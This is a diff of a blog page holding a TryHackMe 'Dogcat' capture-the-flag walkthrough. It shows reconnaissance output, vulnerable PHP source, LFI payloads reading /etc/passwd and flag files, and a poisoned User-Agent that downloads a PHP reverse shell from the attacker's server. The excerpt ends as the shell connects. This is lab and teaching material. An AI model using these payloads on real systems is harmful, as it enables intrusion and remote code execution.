@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Dogcat [TryHackMe] – Blog</title>
+    <title>Dogcat [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="Dogcat [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/dogcat/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/dogcat/icon.png">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/dogcat/icon.png">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="Dogcat [TryHackMe]">
     <meta property="twitter:description" content="I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1812,7 +1812,7 @@
 The output of the scan can be seen below:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1829,22 +1829,22 @@ The output of the scan can be seen below:</p>
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">Nmap scan report <span class="k">for</span> 10.10.19.192
-Host is up <span class="o">(</span>0.11s latency<span class="o">)</span>.
-Not shown: <span class="m">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
-<span class="p">|</span> http-methods: 
-<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
-<span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
-<span class="p">|</span>_http-title: dogcat
-No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.19.192
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.11s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: dogcat
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Since we do not have a <strong>SSH</strong> username or password, we will continue with port 80. <br />
 Here we have a page which gives us an option to see a dog or a cat picture.</p>
@@ -1861,7 +1861,7 @@ Here we have a page which gives us an option to see a dog or a cat picture.</p>
 <h3 id="directory-brute-forcing">Directory Brute-Forcing</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1880,24 +1880,24 @@ Here we have a page which gives us an option to see a dog or a cat picture.</p>
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -e -u 10.10.19.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.19.192
-<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
-<span class="o">[</span>+<span class="o">]</span> Expanded:       <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/02/19 09:24:53 Starting <span class="nv">gobuster</span>
-<span class="o">===============================================================</span>
-http://10.10.19.192/cats <span class="o">(</span>Status: 301<span class="o">)</span>
-http://10.10.19.192/dogs <span class="o">(</span>Status: 301<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -e -u 10.10.19.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.0.1
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.19.192
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Expanded:       <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/02/19 09:24:53 Starting <span class="nv">gobuster</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">http://10.10.19.192/cats <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">http://10.10.19.192/dogs <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Two directories were found but we don&rsquo;t have permission to access these resources.</p>
 <hr />
@@ -1918,11 +1918,11 @@ When we click either one of the buttons, we get the index page with a random dog
 To bypass any check, we will encode an index page to base64 and then we will use <a href="https://gchq.github.io/CyberChef/">CyberChef </a> to decode this php file back.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">http://10.10.19.192/?view<span class="o">=</span>php://filter/read<span class="o">=</span>convert.base64-encode/resource<span class="o">=</span>dog/../index
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://10.10.19.192/?view<span class="o">=</span>php://filter/read<span class="o">=</span>convert.base64-encode/resource<span class="o">=</span>dog/../index
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -1937,7 +1937,7 @@ To bypass any check, we will encode an index page to base64 and then we will use
 <p>The encoded string is appended right after &ldquo;Here you go!&rdquo; message.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1972,69 +1972,69 @@ To bypass any check, we will encode an index page to base64 and then we will use
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">HTML</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">dogcat</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="nx">link</span> <span class="nx">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;/style.css&#34;</span><span class="o">&gt;</span>
-<span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">dogcat</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="nx">i</span><span class="o">&gt;</span><span class="nx">a</span> <span class="nx">gallery</span> <span class="nx">of</span> <span class="nx">various</span> <span class="nx">dogs</span> <span class="k">or</span> <span class="nx">cats</span><span class="o">&lt;/</span><span class="nx">i</span><span class="o">&gt;</span>
-
-    <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
-        <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">What</span> <span class="nx">would</span> <span class="nx">you</span> <span class="nx">like</span> <span class="nx">to</span> <span class="nx">see</span><span class="o">?&lt;/</span><span class="nx">h2</span><span class="o">&gt;</span>
-        <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;/?view=dog&#34;</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;dog&#34;</span><span class="o">&gt;</span><span class="nx">A</span> <span class="nx">dog</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">a</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;/?view=cat&#34;</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;cat&#34;</span><span class="o">&gt;</span><span class="nx">A</span> <span class="nx">cat</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">a</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
-        <span class="o">&lt;?</span><span class="nx">php</span>
-            <span class="k">function</span> <span class="nf">containsStr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="p">{</span>
-                <span class="k">return</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">;</span>
-            <span class="p">}</span>
-	    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ext&#34;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ext&#34;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
-            <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">]))</span> <span class="p">{</span>
-                <span class="k">if</span><span class="p">(</span><span class="nx">containsStr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">],</span> <span class="s1">&#39;dog&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">containsStr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">],</span> <span class="s1">&#39;cat&#39;</span><span class="p">))</span> <span class="p">{</span>
-                    <span class="k">echo</span> <span class="s1">&#39;Here you go!&#39;</span><span class="p">;</span>
-                    <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$ext</span><span class="p">;</span>
-                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-                    <span class="k">echo</span> <span class="s1">&#39;Sorry, only dogs or cats are allowed.&#39;</span><span class="p">;</span>
-                <span class="p">}</span>
-            <span class="p">}</span>
-        <span class="cp">?&gt;</span><span class="err">
-</span><span class="err">    &lt;/div&gt;
-</span><span class="err">&lt;/body&gt;
-</span><span class="err">
-</span><span class="err">&lt;/html&gt;
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">HTML</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">dogcat</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">link</span> <span class="nx">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;/style.css&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">dogcat</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">i</span><span class="o">&gt;</span><span class="nx">a</span> <span class="nx">gallery</span> <span class="nx">of</span> <span class="nx">various</span> <span class="nx">dogs</span> <span class="k">or</span> <span class="nx">cats</span><span class="o">&lt;/</span><span class="nx">i</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">What</span> <span class="nx">would</span> <span class="nx">you</span> <span class="nx">like</span> <span class="nx">to</span> <span class="nx">see</span><span class="o">?&lt;/</span><span class="nx">h2</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;/?view=dog&#34;</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;dog&#34;</span><span class="o">&gt;</span><span class="nx">A</span> <span class="nx">dog</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">a</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;/?view=cat&#34;</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;cat&#34;</span><span class="o">&gt;</span><span class="nx">A</span> <span class="nx">cat</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">a</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">            <span class="k">function</span> <span class="nf">containsStr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$substr</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ext&#34;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ext&#34;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">containsStr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">],</span> <span class="s1">&#39;dog&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">containsStr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">],</span> <span class="s1">&#39;cat&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s1">&#39;Here you go!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;view&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$ext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s1">&#39;Sorry, only dogs or cats are allowed.&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Analyzing the source code of the <strong>index.php</strong> file, we will find out that <strong>$ext</strong> variable is appending a <strong>.php</strong> extension to our input. Also, we can see that our query must contain the string &ldquo;dog&rdquo; or &ldquo;cat&rdquo;.</p>
 <p>To read the first flag, we will use the following query based on the provided analysis above:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">http://10.10.19.192/?view<span class="o">=</span>php://filter/read<span class="o">=</span>convert.base64-encode/resource<span class="o">=</span>dog/../flag
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://10.10.19.192/?view<span class="o">=</span>php://filter/read<span class="o">=</span>convert.base64-encode/resource<span class="o">=</span>dog/../flag
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Then we can further confirm <strong>Local File Inclusion</strong> with accessing <code>passwd</code> file located in the <code>/etc</code> directory.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">http://10.10.19.192/?view<span class="o">=</span>../../../../etc/cat/../passwd<span class="p">&amp;</span>ext
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://10.10.19.192/?view<span class="o">=</span>../../../../etc/cat/../passwd<span class="p">&amp;</span>ext
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We will intercept our request with <strong>Burp Suite</strong> proxy and then send it to <strong>Repeater</strong>. <br />
 <strong>User-Agent</strong> will be replaced with the following php one liner which will download our prepared reverse shell hosted on our simple python server.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;http://10.9.140.180/shell.php&#39;</span><span class="p">))</span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;http://10.9.140.180/shell.php&#39;</span><span class="p">))</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -2049,30 +2049,30 @@ To bypass any check, we will encode an index page to base64 and then we will use
 <p>Pressing <strong>Send</strong> button in Burp Suite will send our modified request and download the shell file to to the server.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python -m SimpleHTTPServer <span class="m">80</span>
-Serving HTTP on 0.0.0.0 port <span class="m">80</span> ...
-10.10.19.192 - - <span class="o">[</span>19/Feb/2021 10:11:53<span class="o">]</span> <span class="s2">&#34;GET /shell.php HTTP/1.0&#34;</span> <span class="m">200</span> -
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m SimpleHTTPServer <span class="m">80</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> ...
+</span></span><span class="line"><span class="cl">10.10.19.192 - - <span class="o">[</span>19/Feb/2021 10:11:53<span class="o">]</span> <span class="s2">&#34;GET /shell.php HTTP/1.0&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></td></tr></table>
 </div>
 </div><hr />
 <h2 id="gaining-access">Gaining Access</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">http://10.10.19.192/shell.php
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://10.10.19.192/shell.php
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Before visiting our newly uploaded resource in the browser, we will start a listener on the local machine.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2092,25 +2092,25 @@ Serving HTTP on 0.0.0.0 port <span class="m">80</span> ...
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lnvp <span class="m">4444</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.19.192<span class="o">]</span> <span class="m">58382</span>
-Linux 4ec6d4b7cd78 4.15.0-96-generic <span class="c1">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux</span>
- 15:55:29 up <span class="m">42</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.02, 0.13
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
